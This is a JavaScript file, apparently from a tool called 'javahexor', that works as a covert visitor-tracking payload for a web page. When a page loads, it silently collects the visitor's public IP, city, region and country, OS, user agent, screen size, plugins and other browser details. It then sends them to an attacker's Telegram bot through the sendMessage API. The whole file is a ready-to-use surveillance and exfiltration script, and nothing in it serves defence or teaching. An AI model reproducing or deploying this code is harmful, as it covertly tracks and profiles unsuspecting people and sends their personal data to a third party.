// For More Info Visit -> https://github.com/Whitecat18/javahexor
// New : Get OS Information, Coordinates of the device The Time does he opens the site. Location, Public Ipv4 , City , Device Basic Info..etc

// Don't change the Line 5 and 6. Because Automation Script Plays a Role Here.
const botToken = 'YOUR_TELEGRAM_BOT_API_KEY';
const chatId = 'YOUR_CHAT_ID';

const getIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log(error);
  }
};

const getLocation = async () => {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      city: data.city,
      region: data.region,
      country: data.country,
    };
  } catch (error) {
    console.log(error);
  }
};

const getDeviceInfo = () => {
  const language = navigator.language;
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;
  const screenWidth = screen.width;
  const screenHeight = screen.height;
  const colorDepth = screen.colorDepth;
  const cookiesEnabled = navigator.cookieEnabled;
  const doNotTrack = navigator.doNotTrack;
  const plugins = Array.from(navigator.plugins, plugin => ({ name: plugin.name, version: plugin.version }));
  const mimeTypes = Array.from(navigator.mimeTypes, mimeType => mimeType.type);
  return {
    Language: language,
    'User Agent': userAgent,
    Platform: platform,
    'Screen Width': screenWidth,
    'Screen Height': screenHeight,
    'Color Depth': colorDepth,
    'Cookies Enabled': cookiesEnabled,
    'Do Not Track': doNotTrack,
    Plugins: plugins,
    'Mime Types': mimeTypes,
  };
};

const monitorNetworkActivity = () => {
  const networkActivity = {};

  // Monitoring network requests
  window.addEventListener('fetch', event => {
    const url = event.request.url;
    if (!networkActivity[url]) {
      networkActivity[url] = 0;
    }
    networkActivity[url]++;

    console.log(`Request made to: ${url}. Count: ${networkActivity[url]}`);
    // You can add further analysis or alerts based on the network activity here
  });
};

Promise.all([getIP(), getLocation()])
    .then(([publicIP, location]) => {
      const os = `Operating System: ${navigator.platform} ${navigator.oscpu}`;
      const browser = `Browser: ${navigator.userAgent}`;
      const extraInfo = getDeviceInfo();

      const locationInfo = `Location: ${location.city}, ${location.region}, ${location.country}`;
      const publicIPInfo = `Public IP: ${publicIP}`;

      const deviceInfo = Object.entries(extraInfo)
          .map(([key, value]) => `${key}: ${JSON.stringify(value)}`)
          .join('\n');

      // Start monitoring network activity
      monitorNetworkActivity();

      // Prepare and send the entire structured data as a single message
      const message = `
${os}
${browser}
${publicIPInfo}
${locationInfo}
Extra Info:
${deviceInfo}
`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      fetch(url);
    })
    .catch(error => console.log(error));
// Coded By 5mU7X
